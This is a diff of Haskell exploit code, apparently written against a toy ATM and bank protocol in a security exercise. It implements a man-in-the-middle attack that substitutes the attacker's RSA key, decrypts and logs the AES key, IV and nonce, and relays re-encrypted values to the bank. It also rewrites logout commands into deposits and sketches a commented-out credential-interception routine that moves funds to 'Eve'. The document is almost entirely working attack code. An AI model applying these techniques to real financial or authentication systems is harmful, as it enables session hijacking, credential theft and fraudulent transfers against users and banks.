@@ -76,49 +76,49 @@ encodeX509Pubkey (PublicKey size n e) = lToStrict $ encodeASN1 DER [Start Sequen
         BitString (BitArray (fromIntegral size) s), End Sequence] where
     s = lToStrict $ encodeASN1 DER [Start Sequence, IntVal n, IntVal e, End Sequence]
 
+makeAES :: B.ByteString -> AES128
+makeAES key = either (error . show) id . eitherCryptoError $ cipherInit key
+
 mitmHandshake atm bank logTo logFrom = do
     let bufferSize = 4096
     let pubSizeBits = 3072
     expect atm "DUMMY"
     B.hPut bank "DUMMY"
     bankPubRaw <- B.hGetSome bank bufferSize
-    --logFrom bankPubRaw
     (mitmPub, mitmPriv) <- generate (pubSizeBits `div` 8) 0x10001
-    let Just bankPub = decodeX509Pubkey (L.fromChunks [bankPubRaw])
+    let mitmDecrypt = (either (error . show) id) . decrypt Nothing (defaultOAEPParams SHA1) mitmPriv
+    let bankPub = maybe (error "Failed to decode bank pubkey") id $ decodeX509Pubkey (L.fromChunks [bankPubRaw])
     --print bankPub
     --print mitmPub
     let bankPub' = bankPub { public_size = pubSizeBits `div` 8 } -- fiddle with things to get them to work
+    let pubEncrypt = fmap (either (error . show) id) . encrypt (defaultOAEPParams SHA1) bankPub'
     print bankPub'
     B.hPut atm (encodeX509Pubkey mitmPub)
     encAES <- B.hGetSome atm bufferSize
-    --logTo encAES
-    let Right rawAES = decrypt Nothing (defaultOAEPParams SHA1) mitmPriv encAES
-    putStr "Raw AES key: "
-    print $ rawAES
-    let Right aes = eitherCryptoError $ cipherInit rawAES
-    Right mitmAES <- encrypt (defaultOAEPParams SHA1) bankPub' rawAES
+    let rawAES = mitmDecrypt encAES
+    putStr "Raw AES key: " >> print rawAES
+    let aes = makeAES rawAES
+    mitmAES <- pubEncrypt rawAES
     B.hPutStr bank mitmAES -- TODO: memory corruption exploit
     expect bank "DUMMY"
     B.hPut atm "DUMMY"
     encIV <- B.hGetSome atm bufferSize
-    let Right rawIV = decrypt Nothing (defaultOAEPParams SHA1) mitmPriv encIV
-    putStr "Raw AES IV: "
-    print $ rawIV
-    Right mitmIV <- encrypt (defaultOAEPParams SHA1) bankPub' rawIV
+    let rawIV = mitmDecrypt encIV
+    putStr "Raw AES IV: " >> print rawIV
+    mitmIV <- pubEncrypt rawIV
     B.hPutStr bank mitmIV
     expect bank "DUMMY"
     B.hPut atm "DUMMY"
     encNonce <- B.hGetSome atm bufferSize
     let Just aesIV = makeIV rawIV
-    let rawNonce = cfbDecrypt (aes :: AES128) aesIV encNonce
+    let rawNonce = cfbDecrypt aes aesIV encNonce
     putStr "Raw Initial Nonce: "
     print rawNonce
-    let mitmNonce = cfbEncrypt (aes :: AES128) aesIV rawNonce
+    let mitmNonce = cfbEncrypt aes aesIV rawNonce
     B.hPutStr bank mitmNonce
     expect bank "DUMMY"
     B.hPut atm "DUMMY"
     return (aes, aesIV)
-
 
 handshakeExploit bankPort = do
     let bufferSize = 4096
@@ -212,6 +212,19 @@ replaceLogoutWithDeposit aes aesIv action ctxt = if actCmd action == Logout
         ptxt' <- serializeAction action'
         return $ cfbEncrypt aes aesIv ptxt'
     else return ctxt
+
+nextNonce :: MonadRandom m => Action -> m Action
+nextNonce a@(Action {actNewNonce = oldNonce}) = do
+    newNonce <- getRandomBytes 16
+    return $ a { actOldNonce = oldNonce, actNewNonce = newNonce }
+
+{-
+frontRunLogin username pin = do
+    putStrLn $ "Intercepted creds " ++ username ++ ":" ++ pin
+    putStrLn "Transferring everything to Eve"
+    bank <- connectTo "localhost" bankPort
+-}
+    
 
 passiveMitm atm bank logTo logFrom aes aesIv = dumbProxy atm bank (wrap logTo) (wrap logFrom) where
     bufferSize = 4096
